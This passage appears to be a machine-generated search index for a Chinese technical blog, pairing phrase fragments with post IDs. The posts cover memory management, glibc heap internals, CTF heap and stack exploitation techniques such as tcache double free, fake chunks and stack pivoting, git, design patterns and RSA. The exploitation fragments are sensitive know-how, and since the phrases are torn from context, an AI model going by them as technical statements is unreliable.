{\"1\":{\"330\":2}}],[\"然后从地址4开始读取下一个4字节块\",{\"1\":{\"12\":1,\"154\":1}}],[\"然后找\",{\"1\":{\"330\":1}}],[\"然后找到我们的com\",{\"1\":{\"134\":1}}],[\"然后也因为victim\",{\"1\":{\"325\":1}}],[\"然后也没彻底理解一些操作\",{\"1\":{\"308\":1}}],[\"然后largebin中最大的chunk大于我们的需求\",{\"1\":{\"321\":1}}],[\"然后要加入fwd和bck之间\",{\"1\":{\"319\":1}}],[\"然后判断该插入什么合适的位置\",{\"1\":{\"319\":1}}],[\"然后bk\",{\"1\":{\"344\":1}}],[\"然后bck通过fwd\",{\"1\":{\"316\":1}}],[\"然后b和c都去实现d接口\",{\"1\":{\"250\":1}}],[\"然后直接返回\",{\"1\":{\"315\":1}}],[\"然后直接打印出来\",{\"1\":{\"293\":1}}],[\"然后查看chunk结构\",{\"1\":{\"311\":1}}],[\"然后chunk入链\",{\"1\":{\"335\":1}}],[\"然后chunk\",{\"1\":{\"308\":1}}],[\"然后c重写b来添加新的逻辑\",{\"1\":{\"252\":1}}],[\"然后重点是检查机制部分\",{\"1\":{\"308\":1}}],[\"然后构造目标地址+0x18位置的地址为victim的地址\",{\"1\":{\"306\":1}}],[\"然后自己看的glibc2\",{\"1\":{\"304\":1}}],[\"然后是否内存对齐\",{\"1\":{\"289\":1}}],[\"然后当p为0的时候\",{\"1\":{\"329\":1}}],[\"然后当这个事件完成的时候再自动触发其回调函数\",{\"1\":{\"279\":1}}],[\"然后当一个task尝试写入数据的时候\",{\"1\":{\"9\":1,\"151\":1}}],[\"然后我发现一个状况\",{\"1\":{\"358\":1}}],[\"然后我想重新合并回去\",{\"1\":{\"275\":1}}],[\"然后我们再通过malloc\",{\"1\":{\"488\":1}}],[\"然后我们通过劫持程序流程跑到printf处\",{\"1\":{\"473\":1}}],[\"然后我们通过malloc指定大小的chunk来分割这个chunk\",{\"1\":{\"374\":1,\"496\":1}}],[\"然后我们成功完成一次overlapping\",{\"1\":{\"368\":1}}],[\"然后我们分割一个chunk\",{\"1\":{\"367\":1}}],[\"然后我们将这个大chunk分割为chunk3\",{\"1\":{\"365\":1}}],[\"然后我们控制我们的payload\",{\"1\":{\"365\":1,\"369\":1}}],[\"然后我们修改chunk2fd指向我们想要修改的地方\",{\"1\":{\"339\":1}}],[\"然后我们malloc一下\",{\"1\":{\"339\":1}}],[\"然后我们就可以通过\",{\"1\":{\"451\":1}}],[\"然后我们就可以绕过一些题目中的free检查\",{\"1\":{\"55\":1,\"195\":1}}],[\"然后我们就成功完成了一次栈迁移\",{\"1\":{\"446\":1}}],[\"然后我们就得到了main\",{\"1\":{\"287\":1}}],[\"然后我们得到了一堆数据\",{\"1\":{\"131\":1}}],[\"然后我们劫持\",{\"1\":{\"59\":1,\"199\":1}}],[\"然后进行了修改\",{\"1\":{\"275\":1}}],[\"然后进入睡眠\",{\"1\":{\"13\":1,\"155\":1}}],[\"然后等待一堆人讨论后再合并\",{\"1\":{\"269\":1}}],[\"然后忘记存快照了\",{\"1\":{\"259\":1}}],[\"然后开启destop后\",{\"1\":{\"258\":1}}],[\"然后因为我下载了docker\",{\"1\":{\"258\":1}}],[\"然后将free\",{\"1\":{\"441\":1}}],[\"然后将利用开始构造好的fakechunk进行free\",{\"1\":{\"378\":1,\"500\":1}}],[\"然后将victim返回给用户\",{\"1\":{\"313\":1}}],[\"然后将遇到的报错展示出来\",{\"1\":{\"258\":1}}],[\"然后将栈底和pc返回原本的值\",{\"1\":{\"47\":1,\"187\":1}}],[\"然后就可以在第二次返回的时候触发backdoor函数\",{\"1\":{\"480\":1}}],[\"然后就会执行\",{\"1\":{\"446\":1}}],[\"然后就是寻找ld\",{\"1\":{\"453\":1}}],[\"然后就是从unsortedbin割small\",{\"1\":{\"313\":1}}],[\"然后就是我没找到ubuntu16\",{\"1\":{\"262\":1}}],[\"然后就是寄存器赋值\",{\"1\":{\"47\":1,\"187\":1}}],[\"然后就建立链接\",{\"1\":{\"253\":1}}],[\"然后在scanf里面下idapython脚本\",{\"1\":{\"470\":1}}],[\"然后在我们输入最后的位置加入249数据\",{\"1\":{\"460\":1}}],[\"然后在最后申请chunk\",{\"1\":{\"376\":1,\"498\":1}}],[\"然后在malloc的时候没有检查size\",{\"1\":{\"342\":1}}],[\"然后在正式阅读源码之前\",{\"1\":{\"308\":1}}],[\"然后在数据更新的时候调用这个集合\",{\"1\":{\"250\":1}}],[\"然后在创立项目的时候\",{\"1\":{\"105\":1}}],[\"然后广告的数据a\",{\"1\":{\"250\":1}}],[\"然后用户通过view触发一些事件发送给controller\",{\"1\":{\"248\":1}}],[\"然后保证b和c不去依赖a\",{\"1\":{\"245\":1}}],[\"然后说一下优缺点以及代码实现演示\",{\"1\":{\"244\":1}}],[\"然后解密\",{\"1\":{\"240\":1}}],[\"然后解引\",{\"1\":{\"36\":1,\"176\":1}}],[\"然后公开密钥为\",{\"1\":{\"240\":1}}],[\"然后搜索发现是我修改了默认的端口号为11451\",{\"1\":{\"131\":1}}],[\"然后搜索package=xxxx这个xxxx就是包的名字\",{\"1\":{\"130\":1}}],[\"然后再构造里面的fd让它指向fastbin\",{\"1\":{\"491\":1}}],[\"然后再free\",{\"1\":{\"357\":1}}],[\"然后再从top\",{\"1\":{\"329\":1}}],[\"然后再搜索top\",{\"1\":{\"329\":1}}],[\"然后再释放内存\",{\"1\":{\"68\":1,\"208\":1}}],[\"然后再进行内存的释放\",{\"1\":{\"68\":1,\"208\":1}}],[\"然后再跳转返回\",{\"1\":{\"49\":1,\"189\":1}}],[\"然后下面图是大佬博客里面的四级分页机制的图\",{\"1\":{\"63\":1,\"203\":1}}],[\"然后\",{\"1\":{\"60\":1,\"131\":1,\"200\":1,\"289\":1,\"336\":1,\"446\":1,\"451\":1}}],[\"然后调用locked\",{\"1\":{\"60\":1,\"200\":1}}],[\"然后调用\",{\"1\":{\"59\":1,\"60\":1,\"199\":1,\"200\":1,\"420\":1}}],[\"然后总结文章\",{\"1\":{\"53\":1,\"193\":1}}],[\"然后小于3\",{\"1\":{\"50\":1,\"190\":1}}],[\"然后page再分配为slot\",{\"1\":{\"50\":1,\"190\":1}}],[\"然后page占比4kb\",{\"1\":{\"50\":1,\"190\":1}}],[\"然后prctl中第二个参数代表操作的对象\",{\"1\":{\"41\":1,\"181\":1}}],[\"然后存入ra寄存器\",{\"1\":{\"49\":1,\"189\":1}}],[\"然后存储数组指针\",{\"1\":{\"27\":1,\"169\":1}}],[\"然后函数调用的时候直接将原本的sp压栈\",{\"1\":{\"48\":1,\"188\":1}}],[\"然后栈减去\",{\"1\":{\"48\":1,\"188\":1}}],[\"然后更新pc\",{\"1\":{\"47\":1,\"187\":1}}],[\"然后rsi就是我们输入的字符串地址\",{\"1\":{\"482\":1}}],[\"然后r1减去2\",{\"1\":{\"47\":1,\"187\":1}}],[\"然后r11设置为栈顶\",{\"1\":{\"47\":1,\"187\":1}}],[\"然后r0\",{\"1\":{\"47\":1,\"187\":1}}],[\"然后rel\",{\"1\":{\"36\":1,\"176\":1}}],[\"然后推入rax\",{\"1\":{\"45\":1,\"185\":1}}],[\"然后通过申请一个largebin\",{\"1\":{\"490\":1}}],[\"然后通过修改返回地址最后一个字节\",{\"1\":{\"480\":1}}],[\"然后通过第二次double\",{\"1\":{\"474\":1}}],[\"然后通过指向bss表中\",{\"1\":{\"474\":1}}],[\"然后通过调试\",{\"1\":{\"73\":1,\"213\":1}}],[\"然后通过cow进行copy其他代码部分\",{\"1\":{\"67\":1,\"207\":1}}],[\"然后通过dynstr\",{\"1\":{\"36\":1,\"176\":1}}],[\"然后通知用户\",{\"1\":{\"43\":1,\"183\":1}}],[\"然后使用\",{\"1\":{\"43\":1,\"183\":1}}],[\"然后除了\",{\"1\":{\"40\":1,\"180\":1}}],[\"然后dynstr就可以直接调用我们的函数了\",{\"1\":{\"36\":1,\"176\":1}}],[\"然后跳转到\",{\"1\":{\"36\":1,\"176\":1}}],[\"然后jmp到plt\",{\"1\":{\"36\":1,\"176\":1}}],[\"然后压入参数最后压入返回参数\",{\"1\":{\"29\":1,\"171\":1}}],[\"然后对于业务量小的应用来说\",{\"1\":{\"252\":1}}],[\"然后对key进行取hash然后取余\",{\"1\":{\"25\":1,\"167\":1}}],[\"然后对a进行操作的话\",{\"1\":{\"24\":1,\"166\":1}}],[\"然后数组传递过去不会导致原本的值改变\",{\"1\":{\"23\":1,\"165\":1}}],[\"然后数组存储的是一个下标再指向真正的文件描述符数组\",{\"1\":{\"15\":1,\"157\":1}}],[\"然后不断轮询这个列表查看标志位\",{\"1\":{\"20\":1,\"162\":1}}],[\"然后去完成中断处理操作\",{\"1\":{\"20\":1,\"162\":1}}],[\"然后里面存储着详细信息\",{\"1\":{\"15\":1,\"157\":1}}],[\"然后需要了就加载回来\",{\"1\":{\"10\":1,\"152\":1}}],[\"会显示\",{\"1\":{\"464\":2}}],[\"会从标准输入读取数据\",{\"1\":{\"464\":1}}],[\"会折行显示超出屏幕宽度的长行\",{\"1\":{\"464\":1}}],[\"会优先取\",{\"1\":{\"441\":1}}],[\"会将file结构体中的\",{\"1\":{\"384\":1}}],[\"会将返回地址存入栈中\",{\"1\":{\"49\":1,\"189\":1}}],[\"会ptamlloc一个新的分配区\",{\"1\":{\"349\":1}}],[\"会检查线程中是否存在分配区\",{\"1\":{\"349\":1}}],[\"会默认会被放到fast\",{\"1\":{\"347\":1}}],[\"会使用unlink\",{\"1\":{\"344\":1}}],[\"会for循环迭代tcache查看是否有指针和这个即将free的chunk的指针一样\",{\"1\":{\"342\":1}}],[\"会在free进入tcache后在bk位置写入随机数\",{\"1\":{\"342\":1}}],[\"会先搜索bins\",{\"1\":{\"329\":1}}],[\"会先写入磁盘\",{\"1\":{\"68\":1,\"208\":1}}],[\"会返回一个生成器对象\",{\"1\":{\"281\":1}}],[\"会去循环以及准备好的堵塞事件\",{\"1\":{\"279\":1}}],[\"会生成\",{\"1\":{\"254\":1}}],[\"会根据不同的参数来打开不同的界面\",{\"1\":{\"143\":1}}],[\"会发生什么\",{\"1\":{\"68\":1,\"208\":1}}],[\"会改变代码段\",{\"1\":{\"67\":1,\"207\":1}}],[\"会让子进程都受到这个过滤器的限制\",{\"1\":{\"41\":1,\"181\":1}}],[\"会专门产生一个闭包结构体来存储这些外部引用变量\",{\"1\":{\"31\":1,\"173\":1}}],[\"会修改变量的值\",{\"1\":{\"24\":1,\"166\":1}}],[\"会把其他正在运行的进程\",{\"1\":{\"10\":1,\"152\":1}}],[\"会抛出一个异常\",{\"1\":{\"9\":1,\"151\":1}}],[\"当一个线程结束时\",{\"1\":{\"458\":1}}],[\"当前page使用类型\",{\"1\":{\"438\":1}}],[\"当前request使用chunk峰值\",{\"1\":{\"438\":1}}],[\"当前已用内存数\",{\"1\":{\"438\":1}}],[\"当前chunk的剩余page数\",{\"1\":{\"438\":1}}],[\"当前chunk的\",{\"1\":{\"319\":1}}],[\"当数据写入缓冲区的时候\",{\"1\":{\"426\":1}}],[\"当执行流从\",{\"1\":{\"423\":1}}],[\"当执行\",{\"1\":{\"423\":1}}],[\"当\",{\"1\":{\"423\":1}}],[\"当用户释放的内存大于max\",{\"1\":{\"347\":1}}],[\"当用户释放一块不大于max\",{\"1\":{\"347\":1}}],[\"当bins上都不能满足内存分配要求的时候\",{\"1\":{\"347\":1}}],[\"当检查一样时候\",{\"1\":{\"342\":1}}],[\"当对应的tcahe\",{\"1\":{\"285\":1}}],[\"当我们执行read函数的时候\",{\"1\":{\"446\":1}}],[\"当我们可以多写一个字节的时候我们可以构造一个fake\",{\"1\":{\"345\":1}}],[\"当我们申请0xn0和0xn8内存大小的时候\",{\"1\":{\"330\":1}}],[\"当我们需求的chunk\",{\"1\":{\"319\":1}}],[\"当我们在函数使用了yield关键字后\",{\"1\":{\"281\":1}}],[\"当我们获取到java类之后\",{\"1\":{\"121\":1}}],[\"当然后续会更新\",{\"1\":{\"244\":1}}],[\"当然前提是别是禁用所有用户\",{\"1\":{\"42\":1,\"182\":1}}],[\"当a是p的倍数\",{\"1\":{\"239\":1}}],[\"当时他们三人都在麻省理工学院工作\",{\"1\":{\"238\":1}}],[\"当open\",{\"1\":{\"79\":1,\"219\":1}}],[\"当题目中不存在vmlinux文件的时候\",{\"1\":{\"73\":1,\"213\":1}}],[\"当进行申请内存\",{\"1\":{\"68\":1,\"208\":1}}],[\"当函数返回的时候\",{\"1\":{\"49\":1,\"189\":1}}],[\"当将内容填充进入cq\",{\"1\":{\"43\":1,\"183\":1}}],[\"当接收到中断信号后\",{\"1\":{\"21\":1,\"163\":1}}],[\"当不同进程要对内存数据进行修改的时候就会触发写时复制\",{\"1\":{\"17\":1,\"159\":1}}],[\"当创建子进程的时候父进程直接将虚拟内存到物理内存的映射关系复制到子进程中\",{\"1\":{\"17\":1,\"159\":1}}],[\"当fork函数调用用了新的进程后\",{\"1\":{\"16\":1,\"158\":1}}],[\"当内存空间不足的时候\",{\"1\":{\"10\":1,\"152\":1}}],[\"当调用\",{\"1\":{\"4\":1,\"147\":1}}],[\"减小页表\",{\"1\":{\"10\":2,\"152\":2}}],[\"一次性4字节shellcode空间\",{\"1\":{\"482\":1}}],[\"一次性读取数据就是32位也就是4字节\",{\"1\":{\"12\":1,\"154\":1}}],[\"一筹莫展\",{\"1\":{\"463\":1}}],[\"一对应\",{\"1\":{\"449\":1}}],[\"一\",{\"1\":{\"449\":1}}],[\"一看就懂\",{\"1\":{\"432\":1}}],[\"一会儿思维就通了\",{\"1\":{\"402\":1}}],[\"一种新的glibc中io攻击方法\",{\"1\":{\"382\":1,\"393\":1,\"397\":1}}],[\"一种是直接revert\",{\"1\":{\"274\":1}}],[\"一道题彻底理解\",{\"1\":{\"295\":1}}],[\"一共两个部分\",{\"1\":{\"338\":1}}],[\"一共有64个bins\",{\"1\":{\"285\":1}}],[\"一共有三个方法\",{\"1\":{\"254\":1}}],[\"一共16个\",{\"1\":{\"47\":1,\"187\":1}}],[\"一些基本的函数\",{\"1\":{\"252\":1}}],[\"一些长的寄存器可以改为短的寄存器\",{\"1\":{\"42\":1,\"182\":1}}],[\"一起提出的\",{\"1\":{\"238\":1}}],[\"一元运算抽象语法树\",{\"0\":{\"92\":1,\"232\":1}}],[\"一般开发的时候\",{\"1\":{\"400\":1}}],[\"一般小内存\",{\"1\":{\"347\":1}}],[\"一般申请较大的内存空间\",{\"1\":{\"327\":1}}],[\"一般是prev\",{\"1\":{\"329\":1}}],[\"一般是填写一个表格\",{\"1\":{\"270\":1}}],[\"一般是master\",{\"1\":{\"268\":1}}],[\"一般用于处理事件并且做出响应\",{\"1\":{\"249\":1}}],[\"一般情况下我们需要提取出来ko文件\",{\"1\":{\"73\":1,\"213\":1}}],[\"一般多线程\",{\"1\":{\"66\":1,\"206\":1}}],[\"一般来说我们的逻辑地址会经历转化才回到真正的物理地址去\",{\"1\":{\"63\":1,\"203\":1}}],[\"一般共享访问的页面标记为可读\",{\"1\":{\"9\":1,\"151\":1}}],[\"一篇文章彻底讲懂malloc的实现\",{\"1\":{\"53\":1,\"193\":1}}],[\"一等公民是指支持所有通常可用于其他实体的操作的实体\",{\"1\":{\"32\":1,\"174\":1}}],[\"一等公民\",{\"0\":{\"32\":1,\"174\":1}}],[\"一个栈迁移\",{\"1\":{\"485\":1}}],[\"一个在\",{\"1\":{\"396\":1}}],[\"一个chunk\",{\"1\":{\"365\":1,\"438\":1}}],[\"一个chunk会被分配为page\",{\"1\":{\"50\":1,\"190\":1}}],[\"一个分配区可以给多个线程使用\",{\"1\":{\"347\":1}}],[\"一个是对应链表的元素数量\",{\"1\":{\"338\":1}}],[\"一个是对应大小的tcache\",{\"1\":{\"338\":1}}],[\"一个是reloc\",{\"1\":{\"36\":1,\"176\":1}}],[\"一个gundam包含两个chunk\",{\"1\":{\"287\":1}}],[\"一个大于1的自然数\",{\"1\":{\"240\":1}}],[\"一个测试脚本\",{\"0\":{\"131\":1}}],[\"一个好看的电子书网站\",{\"1\":{\"113\":1}}],[\"一个线程也可以拥有多个协程\",{\"1\":{\"23\":1,\"165\":1}}],[\"一个页表至少是11\",{\"1\":{\"10\":1,\"152\":1}}],[\"一文轻松理解内存对齐\",{\"1\":{\"12\":1,\"154\":1}}],[\"而udp是固定的8字节\",{\"1\":{\"433\":1}}],[\"而在fastbin为空时\",{\"1\":{\"284\":1}}],[\"而不是直接接触\",{\"1\":{\"252\":1}}],[\"而不是直接在a的b里面进行添加逻辑\",{\"1\":{\"252\":1}}],[\"而不是一个具体的函数或者具体的结构体\",{\"1\":{\"252\":1}}],[\"而不是依赖语句的实现\",{\"1\":{\"252\":1}}],[\"而不是class\",{\"1\":{\"134\":1}}],[\"而且没有对content\",{\"1\":{\"489\":1}}],[\"而且经过测试仿佛这里的base\",{\"1\":{\"378\":1,\"500\":1}}],[\"而且我觉得自己手动查看上次的commit内容并且删除对应文件有点麻烦\",{\"1\":{\"272\":1}}],[\"而且本文可能对原文的理解有偏差而且并没有实际的代码列子来进行辅助理解\",{\"1\":{\"244\":1}}],[\"而且这个tls会存储canary的值\",{\"1\":{\"38\":1,\"178\":1}}],[\"而alloc\",{\"1\":{\"70\":1,\"210\":1}}],[\"而64位操作系统内核和用户空间是存在一大块空洞空间的\",{\"1\":{\"70\":1,\"210\":1}}],[\"而非malloc函数的brk等\",{\"1\":{\"50\":1,\"190\":1}}],[\"而tls会保存在stack高地址的地方\",{\"1\":{\"38\":1,\"178\":1}}],[\"而是只允许我以r方式打开\",{\"1\":{\"503\":1}}],[\"而是横向滚动显示\",{\"1\":{\"464\":1}}],[\"而是我们先revert掉g\",{\"1\":{\"275\":1}}],[\"而是先revert\",{\"1\":{\"275\":1}}],[\"而是一个模块对一类行为者负责\",{\"1\":{\"252\":1}}],[\"而是直接栈溢出足够多的数据来复写tls中的tcbhead\",{\"1\":{\"38\":1,\"178\":1}}],[\"而是保存下一级页表的起始地址\",{\"1\":{\"10\":1,\"152\":1}}],[\"而数组是值类型\",{\"1\":{\"23\":1,\"165\":1}}],[\"而完全是由程序所控制\",{\"1\":{\"23\":1,\"165\":1}}],[\"而软中断是单独有个守护进程不断轮询标志位\",{\"1\":{\"20\":1,\"162\":1}}],[\"而软中断比如\",{\"1\":{\"20\":1,\"162\":1}}],[\"而并行是三个人同时吃三个馒头\",{\"1\":{\"14\":1,\"156\":1}}],[\"而并行是物理上的同时发生\",{\"1\":{\"14\":1,\"156\":1}}],[\"而接收管道输出的接收进程\",{\"1\":{\"13\":1,\"155\":1}}],[\"而如果是64bit的地址空间\",{\"1\":{\"10\":1,\"152\":1}}],[\"而其他调用者所见到的最初的资源仍然保持不变\",{\"1\":{\"8\":1,\"150\":1}}],[\"6的当前绑定地址\",{\"1\":{\"455\":1}}],[\"6b0\",{\"1\":{\"365\":1,\"369\":1}}],[\"6链接库实现\",{\"1\":{\"327\":1}}],[\"619\",{\"1\":{\"261\":1}}],[\"614286773\",{\"1\":{\"273\":1}}],[\"61428\",{\"1\":{\"131\":1}}],[\"66667\",{\"1\":{\"261\":1}}],[\"66800574\",{\"1\":{\"140\":1}}],[\"6711535f8c6a\",{\"1\":{\"258\":1}}],[\"63\",{\"1\":{\"258\":1}}],[\"65030\",{\"1\":{\"488\":1}}],[\"65537\",{\"1\":{\"240\":1,\"243\":1}}],[\"651057404\",{\"1\":{\"10\":1,\"152\":1}}],[\"64814\",{\"1\":{\"491\":1}}],[\"647\",{\"1\":{\"483\":1}}],[\"64s\",{\"1\":{\"479\":1}}],[\"64472\",{\"1\":{\"473\":1}}],[\"64到126是large\",{\"1\":{\"347\":1}}],[\"64b\",{\"1\":{\"284\":1}}],[\"64\",{\"1\":{\"73\":1,\"213\":1,\"391\":1,\"438\":1,\"449\":1,\"456\":1,\"469\":1,\"503\":2}}],[\"64t的直接映射区\",{\"1\":{\"70\":1,\"210\":1}}],[\"64位数量是8\",{\"1\":{\"352\":1}}],[\"64位操作系统用前32位进行当作负载\",{\"1\":{\"82\":1,\"222\":1}}],[\"64位操作系统是成功的\",{\"1\":{\"71\":1,\"211\":1}}],[\"64位操作系统一次性读取是64位也就是8字节\",{\"1\":{\"12\":1,\"154\":1}}],[\"64位的由于空间巨大\",{\"1\":{\"70\":1,\"210\":1}}],[\"64位内核内存分布\",{\"1\":{\"70\":1,\"210\":1}}],[\"64位是16\",{\"1\":{\"70\":1,\"210\":1}}],[\"64位\",{\"1\":{\"44\":1,\"184\":1,\"329\":1,\"330\":1,\"357\":1}}],[\"64架构上\",{\"1\":{\"38\":1,\"178\":1}}],[\"6\",{\"1\":{\"12\":1,\"30\":4,\"41\":1,\"154\":1,\"172\":4,\"181\":1,\"244\":1,\"261\":1,\"365\":4,\"366\":2,\"367\":3,\"368\":2,\"369\":9,\"373\":1,\"376\":2,\"378\":2,\"380\":5,\"397\":1,\"456\":3,\"460\":1,\"461\":2,\"462\":5,\"464\":1,\"491\":5,\"495\":1,\"498\":2,\"500\":2,\"502\":5,\"503\":2}}],[\"6mbyte\",{\"1\":{\"10\":1,\"152\":1}}],[\"至少是2\",{\"1\":{\"10\":1,\"152\":1}}],[\"~0u\",{\"1\":{\"339\":1}}],[\"~0xf\",{\"1\":{\"289\":1,\"290\":1}}],[\"~\",{\"1\":{\"10\":1,\"13\":1,\"14\":1,\"15\":1,\"40\":1,\"152\":1,\"155\":1,\"156\":1,\"157\":1,\"180\":1,\"244\":1,\"255\":1,\"263\":1,\"312\":1}}],[\"内容被阶段了\",{\"1\":{\"360\":1}}],[\"内部传给本地\",{\"1\":{\"258\":1}}],[\"内核会申请一个cred结构体\",{\"1\":{\"78\":1,\"218\":1}}],[\"内核会定期检查sq如果有新的请求就并行处理\",{\"1\":{\"43\":1,\"183\":1}}],[\"内核地址空间布局随机化\",{\"1\":{\"74\":1,\"214\":1}}],[\"内核页表隔离\",{\"1\":{\"74\":1,\"214\":1}}],[\"内核处理\",{\"1\":{\"43\":1,\"183\":1}}],[\"内核处理该异常\",{\"1\":{\"9\":1,\"151\":1}}],[\"内核在缺页异常的回调处理函数中进行物理内存页的复制\",{\"1\":{\"17\":1,\"159\":1}}],[\"内存映射将文件加载到内存中\",{\"1\":{\"454\":1}}],[\"内存单次申请的峰值\",{\"1\":{\"438\":1}}],[\"内存中提前分配了30相同大小的内存slot\",{\"1\":{\"438\":1}}],[\"内存不可写\",{\"1\":{\"378\":1,\"500\":1}}],[\"内存不足有可能被回收比如java中用new\",{\"1\":{\"82\":1,\"222\":1}}],[\"内存不足也不会去回收\",{\"1\":{\"82\":1,\"222\":1}}],[\"内存不够\",{\"1\":{\"68\":1,\"208\":1}}],[\"内存会怎么样\",{\"1\":{\"71\":1,\"211\":1}}],[\"内存页\",{\"1\":{\"68\":1,\"208\":1}}],[\"内存满了\",{\"1\":{\"68\":1,\"208\":1}}],[\"内存池提前定义好了30种同等大小的内存\",{\"1\":{\"50\":1,\"190\":1}}],[\"内存地址不同\",{\"1\":{\"30\":1,\"172\":1}}],[\"内存对齐\",{\"0\":{\"12\":1,\"154\":1},\"1\":{\"289\":1}}],[\"内存管理\",{\"1\":{\"10\":1,\"50\":1,\"52\":1,\"152\":1,\"190\":1,\"192\":1,\"436\":1}}],[\"内存管理单元\",{\"1\":{\"9\":1,\"151\":1}}],[\"简化后的流程图就是\",{\"1\":{\"302\":1}}],[\"简单的堆题\",{\"1\":{\"474\":1}}],[\"简单栈迁移\",{\"0\":{\"443\":1}}],[\"简单地通过让chunk进入tcache中\",{\"1\":{\"373\":1,\"495\":1}}],[\"简单总结就是如果我fork了一个分支\",{\"1\":{\"275\":1}}],[\"简单来说就是遍历整个分配区表判断是否有锁\",{\"1\":{\"354\":1}}],[\"简单来说就是设置删除检查三步走\",{\"1\":{\"280\":1}}],[\"简单来说就是因此会顺便创建一个tls\",{\"1\":{\"38\":1,\"178\":1}}],[\"简单来说就是\",{\"1\":{\"8\":1,\"150\":1}}],[\"简书\",{\"1\":{\"30\":1,\"172\":1}}],[\"简称cow\",{\"1\":{\"8\":1,\"150\":1}}],[\"因式分解工具\",{\"1\":{\"243\":1}}],[\"因为在free\",{\"1\":{\"490\":1}}],[\"因为在阅读文章的时候\",{\"1\":{\"256\":1}}],[\"因为存在off\",{\"1\":{\"488\":1}}],[\"因为refq不支持跳转超过四字节的地址\",{\"1\":{\"483\":1}}],[\"因为大多数时候我都是去ida直接找的这个gadget\",{\"1\":{\"445\":1}}],[\"因为已经遇到了很多次了\",{\"1\":{\"444\":1}}],[\"因为首部长度在无选项的时候是20字节\",{\"1\":{\"433\":1}}],[\"因为很久以前就知道了沙盒可以使用socket通讯进行传输程序\",{\"1\":{\"432\":1}}],[\"因为上一次double\",{\"1\":{\"380\":1,\"502\":1}}],[\"因为tls处的fd位置我们并没有办法控制\",{\"1\":{\"378\":1,\"500\":1}}],[\"因为题目中存在isused\",{\"1\":{\"372\":1,\"494\":1}}],[\"因为scanf在接受大量数据的时候会申请一个largebin\",{\"1\":{\"372\":1,\"494\":1}}],[\"因为smallbin和largebin的入链操作都含这个代码\",{\"1\":{\"317\":1}}],[\"因为其实是我们专门计算的0x550这个数据\",{\"1\":{\"368\":1}}],[\"因为其实我们大多数时候写的项目都不会很大\",{\"1\":{\"246\":1}}],[\"因为修改chunk\",{\"1\":{\"367\":1}}],[\"因为当tcache\",{\"1\":{\"358\":1}}],[\"因为如果unsorted\",{\"1\":{\"358\":1}}],[\"因为要绕过unlink的安全检查\",{\"1\":{\"345\":1}}],[\"因为还有prev\",{\"1\":{\"339\":1}}],[\"因为large\",{\"1\":{\"319\":1}}],[\"因为largebin是按照大小进行的排序\",{\"1\":{\"319\":1}}],[\"因为是最新的commit\",{\"1\":{\"276\":1}}],[\"因为从git中删除一个commit这通常是一个坏主意\",{\"1\":{\"273\":1}}],[\"因为我们使用的栈其实本质就是基于rbp\",{\"1\":{\"446\":1}}],[\"因为我们常使用leave\",{\"1\":{\"446\":1}}],[\"因为我们需要劫持这个链表所以我们需要再一次触发fastbin的合并构造double\",{\"1\":{\"380\":1,\"502\":1}}],[\"因为我们刚才构造的fake\",{\"1\":{\"368\":1}}],[\"因为我们可以利用下一面一个chunk的prev\",{\"1\":{\"330\":1}}],[\"因为我们将分不清楚什么东西该放进model里面什么东西放进其他业务\",{\"1\":{\"252\":1}}],[\"因为我使用git比较随性\",{\"1\":{\"263\":1}}],[\"因为这题用的两个全局变量来存储的使用情况和chunk地址\",{\"1\":{\"488\":1}}],[\"因为这些寄存器会在\",{\"1\":{\"449\":1}}],[\"因为这次我的问题其实不属于这种情况但是还是写下来\",{\"1\":{\"275\":1}}],[\"因为这个版本之下没有tcache作为一些原理\",{\"1\":{\"262\":1}}],[\"因为这样会导致a中的b过于庞大\",{\"1\":{\"252\":1}}],[\"因为这样父函数执行完毕后栈上变量就失效了\",{\"1\":{\"31\":1,\"173\":1}}],[\"因为\",{\"1\":{\"252\":1,\"446\":1}}],[\"因为不同板块独立性较高所以我们也可以将同一份代码在不同的项目中引用\",{\"1\":{\"246\":1}}],[\"因为私钥就是\",{\"1\":{\"241\":1}}],[\"因为ed\",{\"1\":{\"240\":1,\"242\":1}}],[\"因为cow的关系\",{\"1\":{\"71\":1,\"211\":1}}],[\"因为cpu的时间是宝贵的\",{\"1\":{\"20\":1,\"162\":1}}],[\"因为32位操作系统虚拟内存也就4g\",{\"1\":{\"71\":1,\"211\":1}}],[\"因为线程是共享内存的\",{\"1\":{\"66\":1,\"206\":1}}],[\"因为2\",{\"1\":{\"56\":1,\"196\":1}}],[\"因为太过重要\",{\"1\":{\"53\":1,\"193\":1}}],[\"因为字节很小\",{\"1\":{\"42\":1,\"182\":1}}],[\"因为会导致父节点更新\",{\"1\":{\"8\":1,\"150\":1}}],[\"因此公钥密码通常也称为非对称密码\",{\"1\":{\"238\":1}}],[\"因此可以将乘积公开作为加密密钥\",{\"1\":{\"238\":1}}],[\"因此操作系统通过多级页表的方法减少驻留在内存中的页面尺寸\",{\"1\":{\"10\":1,\"152\":1}}],[\"因此这样一个虚拟内存管理系统分配给一个程序的页表至少需要2^20\",{\"1\":{\"10\":1,\"152\":1}}],[\"因此多个调用者只是读取操作时可以共享同一份资源\",{\"1\":{\"8\":1,\"150\":1}}],[\"性能较为低下\",{\"1\":{\"8\":1,\"150\":1}}],[\"直到其他线程对其进行了回收操作\",{\"1\":{\"458\":1}}],[\"直到碰到unsorted\",{\"1\":{\"310\":1}}],[\"直到释放足够的内存位置\",{\"1\":{\"68\":1,\"208\":1}}],[\"直到某个调用者试图修改资源的内容时\",{\"1\":{\"8\":1,\"150\":1}}],[\"直接返回\",{\"1\":{\"503\":1}}],[\"直接返回smallbin\",{\"0\":{\"313\":1}}],[\"直接double\",{\"1\":{\"474\":1}}],[\"直接就是入链头部没什么好说的\",{\"1\":{\"442\":1}}],[\"直接从文中抠出来的图\",{\"1\":{\"438\":1}}],[\"直接write出size大小的内容\",{\"1\":{\"371\":1,\"493\":1}}],[\"直接free记录信息的chunk和我们的内容体chunk\",{\"1\":{\"371\":1,\"493\":1}}],[\"直接提前\",{\"1\":{\"317\":1}}],[\"直接向emo\",{\"1\":{\"293\":1}}],[\"直接apt\",{\"1\":{\"262\":1}}],[\"直接将chunk链接到fwd后面\",{\"1\":{\"319\":1}}],[\"直接将文件系统挂载在已有的目录中\",{\"1\":{\"73\":1,\"213\":1}}],[\"直接将新的程序的用户空间代码和数据完全替换当前进程\",{\"1\":{\"16\":1,\"158\":1}}],[\"直接调用系统分配\",{\"1\":{\"50\":1,\"190\":1}}],[\"直接进行的映射\",{\"1\":{\"16\":1,\"158\":1}}],[\"直接映射区域\",{\"1\":{\"70\":1,\"210\":1}}],[\"直接映射区\",{\"1\":{\"16\":1,\"158\":1}}],[\"直接看博客中写